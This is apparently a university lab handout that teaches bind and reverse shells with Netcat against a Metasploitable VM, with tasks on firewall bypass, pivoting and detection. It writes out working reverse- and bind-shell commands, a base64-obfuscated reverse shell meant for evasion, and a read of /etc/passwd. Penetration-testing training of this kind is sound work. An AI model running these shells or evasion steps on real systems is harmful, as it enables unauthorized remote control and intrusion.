# Lab 1: Reverse and Bind Shells in Post-Exploitation Techniques (INT407)

#### **Objective:**
In this lab, you will learn to create and exploit **bind** and **reverse** shells using **Netcat** and **Metasploit**, applying post-exploitation techniques to gain control over a compromised system. The lab will focus on using the **IP address of the Metasploitable machine** for the attack.

---

### **Overview:**

- **Bind Shell**: The victim system listens on a specific port, and the attacker connects to that port to gain control over the victim's shell.
- **Reverse Shell**: The victim system connects back to the attacker’s machine on a specific port, allowing the attacker to control the victim's system.

---

### **Prerequisites:**
- You should have **Metasploit** and **Netcat** installed on your attacking machine (Kali Linux, or any similar OS).
- You should have a **Metasploitable** machine set up as your target machine (with IP address, e.g., 192.168.78.6).

---

### **Lab Setup:**
1. **Attacking Machine**: Kali Linux or any penetration testing system.
2. **Target Machine**: Metasploitable (IP: 192.168.78.6).

---

### **Lab Steps:**

#### **Step 1: Understanding Bind Shell**
- A **bind shell** is where the victim system listens on a port, and the attacker connects to it to execute commands remotely.  
- **Scenario**: You will open a listening port on the victim's Metasploitable system and connect to it from the attacking machine.

**1.1 Set up a Bind Shell on the Victim (Metasploitable):**

- Open a terminal on the **Metasploitable** system.
- Use **Netcat** to set up a bind shell on port 1234:
  ```bash
  nc -lvp 1234 -e /bin/bash
  ```

- This command opens port 1234 for incoming connections and attaches the `/bin/bash` shell to that port.

**1.2 Connect to the Bind Shell from the Attacker (Kali):**

- Open a terminal on your **Kali Linux** system.
- Connect to the victim’s IP (192.168.78.6) on port 1234:
  ```bash
  nc -nv 192.168.78.6 1234
  ```

- Once the connection is established, you will have access to the victim’s shell, allowing you to execute commands like `ls`, `cat`, and more.

#### **Step 2: Understanding Reverse Shell**
- A **reverse shell** is where the victim system connects back to the attacker's machine, bypassing firewall restrictions.

**2.1 Set up a Reverse Shell Listener on the Attacker (Kali):**

- On the attacking system (Kali), open a terminal and listen on port 666 for incoming connections:
  ```bash
  nc -lvp 666
  ```

- This command listens on port 666 for any incoming connections from the victim.

**2.2 Connect from the Victim (Metasploitable) to the Attacker’s Listener:**

- On the **Metasploitable** system, initiate the reverse shell to the attacking machine:
  ```bash
  nc 192.168.78.147 666 -e /bin/bash
  ```

- Replace `192.168.78.147` with the IP address of your attacking machine (Kali). The victim will now connect back to the attacker’s system.

**2.3 Execute Commands on the Victim’s System:**

- Once the victim connects back to the attacker, you will have full control over the victim’s system.  
- You can now execute commands on the victim’s shell, such as:
  ```bash
  ls
  cat /etc/passwd
  ```

- Observe the results on your terminal.

---

### **Step 3: Exploring Practical Use Cases**
- **Bind Shell Use Case**: Often used in situations where the attacker needs to connect to a target and control it remotely. However, it may be blocked by firewalls.
- **Reverse Shell Use Case**: Ideal when the victim’s machine is behind a firewall and unable to open inbound connections, as the victim makes the outbound connection to the attacker.

---

### **Engaging Real-World Tasks**

After the initial setup, you will perform the following tasks, which replicate real-world penetration testing scenarios. These tasks are designed to enhance your understanding of bind and reverse shells and their use in live environments.

#### **Task 1: Bind Shell with Port Scanning and Firewall Bypass**
1. **Setup**: You have successfully established a bind shell on the victim’s machine using Netcat. Now, simulate a real-world firewall restriction:
   - Check if the victim’s firewall is blocking your bind shell by scanning the open ports using tools like `nmap` or `netstat`.
   - You can try running:
     ```bash
     nmap 192.168.78.6
     ```

2. **Action**: If the bind port is blocked by a firewall, attempt to bypass the firewall using:
   - Reverse shell techniques.
   - Adjust the bind port to a higher, less suspicious port number (e.g., 50000).
   
3. **Deliverable**: Provide a report detailing the steps to bypass the firewall and list alternative ports you might use.

---

#### **Task 2: Reverse Shell Obfuscation and Evasion**
1. **Setup**: Now that you understand how to initiate a reverse shell, simulate an evasion technique:
   - Use **Netcat** for the reverse shell but obfuscate your commands using techniques like base64 encoding.
   
2. **Action**: Execute a reverse shell in an obfuscated way by encoding the payload:
   ```bash
   echo 'nc -e /bin/bash 192.168.78.147 666' | base64
   ```

   On the victim machine, decode the command and execute the reverse shell.

3. **Deliverable**: Demonstrate how obfuscation can evade network monitoring tools and explain how security systems can detect and mitigate these evasion techniques.

---

#### **Task 3: Post-Exploitation Pivoting with Reverse Shell**
1. **Setup**: You are now in control of the victim’s system using a reverse shell. The objective is to pivot through the victim’s network to attack other systems.
   
2. **Action**: 
   - Use the victim system to scan for other active machines in the same network.
   - Once you find another machine, use a reverse shell from the victim machine to attack that second system. 
   - You can try using `nmap` or Netcat to perform the scan:
     ```bash
     nmap -sP 192.168.78.0/24
     ```

3. **Deliverable**: Document your pivoting process, including how you used the compromised Metasploitable system to explore the network and escalate your privileges.

---

### **Lab Challenges:**
1. Experiment with different ports for both bind and reverse shells.
2. Try using **Metasploit** to create a reverse shell listener instead of Netcat.
3. Investigate how to use **Metasploit**’s **Meterpreter** for more advanced shell manipulation.
4. Write scripts that automate the reverse shell process and evade detection.

---

### **Lab Report:**
Prepare a detailed report including:
- **Step-by-step procedure** you followed.
- **Screenshots** of the shell access and command outputs.
- Any **troubleshooting steps** you encountered (e.g., firewall configurations).
- A discussion on the **advantages** and **disadvantages** of bind vs reverse shells.

---

### **Next Steps:**
- After completing this lab, you should be comfortable with using both bind and reverse shells for post-exploitation activities.
- Continue with more advanced post-exploitation tasks in future labs.

--- 

### **Conclusion:**
In this lab, you successfully created bind and reverse shells using **Netcat**, gaining remote control over a compromised Metasploitable system. You now understand the differences between bind and reverse shells and the scenarios in which each is used. This fundamental post-exploitation technique is essential for ethical hacking and penetration testing engagements. Through practical tasks and challenges, you also gained insights into real-world scenarios and how to evade detection and pivot through compromised networks.